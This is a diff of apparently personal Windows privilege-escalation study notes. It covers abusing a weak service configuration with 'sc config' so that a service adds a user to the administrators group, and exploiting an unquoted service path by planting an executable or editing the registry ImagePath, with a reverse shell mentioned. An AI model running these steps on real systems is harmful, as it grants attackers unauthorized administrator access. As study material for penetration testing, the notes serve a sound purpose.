@@ -318,7 +318,15 @@ We need to query the service with the command ---> sc qc $service_name, we will 
 Because we have the status of SERVICE_CHANGE_CONFIG we can modify the service configuration with the command ---> sc config $service_name binpath= "net localgroup administrators user /add".
 We need to query the service with the command ---> sc qc $service_name we need to see that the BINARY_PATH_NAME is changed to "net localgroup administrators user /add".
 Now lets stop the service with the command ---> sc start $service_name.
-
+```
+# Escalation via Unquoted Service Path
+```
+We can use a tool like powerup.ps1 with the command ---> poewrshell -ep bypass and . .\powerup.ps1 and Invoke_AllChecks.
+We will go to the place named Checking for unqouted service paths, and will look for unquotedsvc with will see th path and we will see that there are alot of spaces and no quotes.
+We can abuse it because it will look for .exe files between the paths that are in the path that we see (for example c:\program files it will look for program.exe program files.exe and then will move to the next path.).
+If we will go to the Registry Editor we can go to Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PNRPsvc and we will see unquotedsvc folder, we will see the ImagePath and we will add our .exe file in the path.
+We can create a reverse shell and listen on nc/ meterpreter etc... and put it on the windows machine.
+After we've added our .exe file to the windows machine we need to start the service with the command ---> sc start unquotedsvc.
 ```
 # rdesktop connection 
 ```
